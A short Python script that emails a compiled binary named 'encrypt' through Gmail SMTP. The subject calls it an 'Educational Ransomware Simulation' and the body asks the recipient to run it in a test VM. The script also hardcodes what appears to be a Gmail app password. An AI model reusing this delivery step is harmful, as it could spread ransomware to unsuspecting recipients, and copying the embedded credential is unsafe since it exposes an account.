import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

def send_email():
    sender_email = "stupiduser7969@gmail.com"  # Replace with your Gmail
    receiver_email = "adversary112@gmail.com"  # Replace with the target email
    password = "fdwy bmzp aeui fgoy"  # Your Gmail app password

    subject = "Test File for Educational Ransomware Simulation"
    body = "Hey, please check the attached file for our lab demo. Only run this in the test VM."

    # Set up the message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Attach the message body
    msg.attach(MIMEText(body, 'plain'))

    # Path to the file you want to attach (adjust this!)
    filename = "encrypt"  # or "encrypt.exe" on Windows
    filepath = os.path.join("dist", filename)

    # Open and attach the file
    with open(filepath, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={filename}")
        msg.attach(part)

    # Send the email via Gmail SMTP
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())

    print("✅ Email sent successfully!")

# Run it
send_email()
